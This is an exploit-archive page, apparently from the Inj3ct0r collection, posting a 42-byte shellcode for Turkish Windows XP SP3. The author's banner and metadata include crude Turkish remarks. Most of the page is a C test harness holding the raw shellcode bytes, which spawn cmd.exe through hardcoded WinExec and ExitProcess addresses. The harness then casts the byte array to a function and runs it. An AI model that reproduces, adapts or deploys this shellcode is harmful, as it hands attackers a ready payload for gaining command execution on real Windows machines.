<html><head><title>Windows - sp3 (Tr) cmd.exe Shellcode - 42 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1                 ###########################################          1
0                 I'm ZoRLu member from Inj3ct0r Team                  1
1                 ###########################################          0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

# Title        : win32/xp sp3 (Tr) cmd.exe Shellcode 42 bytes
# Proof        : http://img36.imageshack.us/img36/1183/cmdm.jpg
# Plat.        : win32 / windows
# Author       : ZoRLu / http://inj3ct0r.com/author/577
# mail-msn     : admin@yildirimordulari.com
# Home         : http://z0rlu.blogspot.com
# Thanks       : http://inj3ct0r.com / http://www.exploit-db.com / http://packetstormsecurity.org / http://shell-storm.org
# Date         : 01/10/2010
# Tesekkur     : r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Lakirdi      : Okudugumuz icin Cezalandiran Sistemin amina koyim / Kpss Anani ...
# Lakirdi      : Son 31 Gun
 
 
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
   
int main(){
      
    unsigned char shellcode[]=
    &quot;\x31\xc0\xeb\x13\x5b\x88\x43\x0e\x53\xbb\xad\x23\x86\x7c\xff\xd3\xbb&quot;
    &quot;\xfa\xca\x81\x7c\xff\xd3\xe8\xe8\xff\xff\xff\x63\x6d\x64\x2e\x65\x78&quot;
    &quot;\x65\x20\x2f\x63\x20\x63\x6d\x64&quot;;
   
    printf(&quot;Size = %d bytes\n&quot;, strlen(shellcode));
   
    ((void (*)())shellcode)();
      
      
   
    return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
